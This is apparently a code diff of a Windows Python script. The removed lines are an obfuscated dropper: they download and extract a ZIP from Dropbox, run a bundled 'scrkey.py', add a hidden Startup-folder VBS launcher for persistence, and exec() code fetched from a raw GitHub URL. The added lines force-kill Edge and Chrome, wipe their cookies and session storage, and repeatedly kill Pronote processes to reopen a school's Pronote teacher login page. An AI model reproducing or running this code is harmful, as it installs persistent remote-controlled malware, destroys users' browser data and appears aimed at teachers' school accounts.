@@ -1,50 +1,166 @@
-F='Appaqsd'
-E=open
-B=print
-import os as A,requests as M,time as I
-import threading
-import subprocess
 import os
+import subprocess
 import time
 import webbrowser
-G='last_drop.txt'
-if A.path.exists(G):
-	with E(G,'r')as C:N=int(C.read().strip())
-	if I.time()-N<600:B('Drop was run less than 10 minutes ago. Exiting.');exit()
-O='https://www.dropbox.com/scl/fi/sbq9413hwmjfwa7tfls7l/Appaqsd.zip?rlkey=6fc350kb9f0rvh676o7v5n06g&dl=1'
-J=A.path.join('Appaqsd.zip')
-with M.get(O,stream=True)as K:
-	K.raise_for_status()
-	with E(J,'wb')as C:
-		for P in K.iter_content(chunk_size=8192):C.write(P)
-B('Downloaded the ZIP file.')
-L=f"tar -xf {J}"
-B(L)
-A.system(L)
-B('Extracted the ZIP file.')
-B(f"Executing the program...")
-Q=A.path.join(A.getcwd(),F)
-D=A.path.join(A.getcwd(),F)
-D=A.path.join(A.getcwd(),F,'python.exe')
-H=A.path.join(A.getcwd(),F,'scrkey.py')
-B(f"{D} {H}")
-R=A.path.join(A.getenv('APPDATA'),'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
-S=A.path.join(R,'LaunchStartupLANs.vbs')
-T=f'''
-Set WshShell = CreateObject("WScript.Shell")
-
-WshShell.CurrentDirectory = "{Q}"
-WshShell.Run "{D} {H}", 0, True
-Set WshShell = Nothing 
-'''
-with E(S,'w')as U:U.write(T.strip())
-with E(G,'w')as C:C.write(str(int(I.time())))
-kills = M.get("https://raw.githubusercontent.com/48GE12/52/main/message%20(1).txt")
-textmsg = kills.text
-# execute in a new thread
-def execute_python(textmsg):
-    exec(textmsg)
-thread = threading.Thread(target=execute_python, args=(textmsg,))
-thread.start()
-A.system(f"{D} {H}")
-B('Executed the program.')
+# check if the script has been run before 5 minutes ago
+# if it has, just exit
+# exeample : 1712418564
+timestamp_file = 'last_run.txt'
+if os.path.exists(timestamp_file):
+    with open(timestamp_file, 'r') as f:
+        last_run_timestamp = int(f.read().strip())
+    if time.time() - last_run_timestamp < 300:
+        print("Script was run less than 5 minutes ago. Exiting.")
+        exit()
+ 
+def kill_browser_processes(browser_name):
+    process_names = {
+        'edge': 'msedge.exe',
+        'chrome': 'chrome.exe'
+    }
+    try:
+        subprocess.run(['taskkill', '/F', '/IM', process_names[browser_name]], check=True)
+        time.sleep(1)
+        print(f"Killed all {browser_name} processes.")
+    except subprocess.CalledProcessError as e:
+        print(f"Failed to kill {browser_name} processes: {e}")
+ 
+def delete_cookies_file(browser_name):
+    cookies_paths = {
+        'edge': r'Microsoft\Edge\User Data\Default\Network\Cookies',
+        'chrome': r'Google\Chrome\User Data\Default\Network\Cookies'
+    }
+    local_storage_paths = {
+        'edge': r'Microsoft\Edge\User Data\Default\Local Storage',
+        'chrome': r'Google\Chrome\User Data\Default\Local Storage'
+    }
+ 
+    session_storage_paths = {
+        'edge': r'Microsoft\Edge\User Data\Default\Session Storage',
+        'chrome': r'Google\Chrome\User Data\Default\Session Storage'
+    }
+ 
+    storage_paths = {
+        'edge': r'Microsoft\Edge\User Data\Default\Storage',
+        'chrome': r'Google\Chrome\User Data\Default\Storage'
+    }
+ 
+    sessions_paths = {
+        'edge': r'Microsoft\Edge\User Data\Default\Sessions',
+        'chrome': r'Google\Chrome\User Data\Default\Sessions'
+    }
+ 
+    cookie_path = os.path.join(os.getenv('LOCALAPPDATA'), cookies_paths[browser_name])
+ 
+    try:
+        try:
+            os.remove(cookie_path)
+        except FileNotFoundError:
+            print(f"Cookies for {browser_name} not found or already deleted.")
+        except PermissionError:
+            print(f"Lack of permission to delete cookies for {browser_name}. Make sure the browser is not running.")
+        except Exception as e:
+            print(f"Could not delete cookies for {browser_name}: {e}")
+ 
+        try:
+            for root, dirs, files in os.walk(os.path.join(os.getenv('LOCALAPPDATA'), local_storage_paths[browser_name]), topdown=False):
+                for name in files:
+                    os.remove(os.path.join(root, name))
+                for name in dirs:
+                    os.rmdir(os.path.join(root, name))
+        except FileNotFoundError:
+            print(f"Local storage for {browser_name} not found or already deleted.")
+        except PermissionError:
+            print(f"Lack of permission to delete local storage for {browser_name}. Make sure the browser is not running.")
+        except Exception as e:
+            print(f"Could not delete local storage for {browser_name}: {e}")
+ 
+        try:
+            for root, dirs, files in os.walk(os.path.join(os.getenv('LOCALAPPDATA'), session_storage_paths[browser_name]), topdown=False):
+                for name in files:
+                    os.remove(os.path.join(root, name))
+                for name in dirs:
+                    os.rmdir(os.path.join(root, name))
+        except FileNotFoundError:
+            print(f"Session storage for {browser_name} not found or already deleted.")
+        except PermissionError:
+            print(f"Lack of permission to delete session storage for {browser_name}. Make sure the browser is not running.")
+        except Exception as e:
+            print(f"Could not delete session storage for {browser_name}: {e}")
+ 
+        try:
+            for root, dirs, files in os.walk(os.path.join(os.getenv('LOCALAPPDATA'), storage_paths[browser_name]), topdown=False):
+                for name in files:
+                    os.remove(os.path.join(root, name))
+                for name in dirs:
+                    os.rmdir(os.path.join(root, name))
+        except FileNotFoundError:
+            print(f"Storage for {browser_name} not found or already deleted.")
+        except PermissionError:
+            print(f"Lack of permission to delete storage for {browser_name}. Make sure the browser is not running.")
+        except Exception as e:
+            print(f"Could not delete storage for {browser_name}: {e}")
+ 
+        try:
+            #remove all files in the Sessions folder
+            for file in os.listdir(os.path.join(os.getenv('LOCALAPPDATA'), sessions_paths[browser_name])):
+                os.remove(os.path.join(os.getenv('LOCALAPPDATA'), sessions_paths[browser_name], file))
+        except FileNotFoundError:
+            print(f"Sessions for {browser_name} not found or already deleted.")
+        except PermissionError:
+            print(f"Lack of permission to delete sessions for {browser_name}. Make sure the browser is not running.")
+        except Exception as e:
+            print(f"Could not delete sessions for {browser_name}: {e}")
+        print(f"Deleted cookies for {browser_name}.")
+    except FileNotFoundError:
+        print(f"Cookies for {browser_name} not found or already deleted.")
+    except PermissionError:
+        print(f"Lack of permission to delete cookies for {browser_name}. Make sure the browser is not running.")
+    except Exception as e:
+        print(f"Could not delete cookies for {browser_name}: {e}")
+ 
+# Kill processes and delete cookies file for Edge and Chrome
+# kill processes only if cookies are not deleted
+kill_browser_processes('edge')
+delete_cookies_file('edge')
+ 
+kill_browser_processes('chrome')
+delete_cookies_file('chrome')
+ 
+# leave a timestamp in a file to indicate the last time the script was run
+with open(timestamp_file, 'w') as f:
+    f.write(str(int(time.time())))
+ 
+ 
+ 
+while True:
+    try:
+        # List all processes
+        tasks = subprocess.check_output(['tasklist'], shell=True, encoding='cp1252')
+ 
+        # Check each line of the tasks for "PRONOTE"
+        pronote_found = False
+        for task in tasks.split("\n"):
+            if "PRONOTE" in task:
+                pronote_found = True
+                # Extract the process ID (PID) from the line
+                pid = [word for word in task.split() if word.isdigit()][0]
+ 
+                # Kill the process with the found PID
+                subprocess.run(['taskkill', '/F', '/PID', pid], shell=True)
+                print(f"Killed process with PID: {pid}")
+ 
+        # If a PRONOTE process was found and killed, open Edge with the specified URL
+        if pronote_found:
+            # Specify the URL
+            url = "https://0920894x.index-education.net/pronote/professeur.html"
+            # Launch Microsoft Edge with the URL
+            webbrowser.register('edge', None, webbrowser.BackgroundBrowser("C://Program Files (x86)//Microsoft//Edge//Application//msedge.exe"))
+            webbrowser.get('edge').open(url)
+            print("Opened Microsoft Edge with the specified URL.")
+ 
+    except Exception as e:
+        print(f"An error occurred: {e}")
+ 
+    # Wait a little before checking again
+    time.sleep(1)
